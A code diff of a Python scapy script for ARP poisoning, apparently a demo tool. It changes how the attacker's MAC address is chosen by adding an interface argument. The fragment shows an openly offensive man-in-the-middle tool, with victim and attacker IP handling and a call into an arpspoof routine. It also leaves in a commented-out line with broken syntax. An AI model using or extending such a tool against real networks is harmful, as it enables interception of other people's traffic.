@@ -17,10 +17,16 @@ def getmac(ip, interface):
 #get mac of host
 #for demo purposes
 #the enp0s3 interface is used
-def gethostmac():
-    macs = [get_if_hwaddr(i) for i in get_if_list()]
-    for m in macs:
-        if m != "00:00:00:00:00:00":
+def gethostmac(interface):
+#    macs = [get_if_hwaddr(i) for i in get_if_list()]
+#    for m in macs:
+#        if m != "00:00:00:00:00:00" and :
+#            hostmac = m
+#            break
+            
+    for i in get_if_list():
+        m = get_if_hwaddr(i)
+        if m != "00:00:00:00:00:00" and (not interface or interface == i):
             hostmac = m
             break
     return hostmac
@@ -46,5 +52,5 @@ def arppoison(victimIP, ipToSpoof, attackerIP, interface):
         print colores.ORANGE + 'Cannot find MAC address of victim\n' + colores.RED + 'End of program' + colores.RESETALL
         sys.exit()
     #for demo, make sure enp0s3 interface is used
-    attackerMAC = gethostmac()
+    attackerMAC = gethostmac(interface)
     arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP, interface)
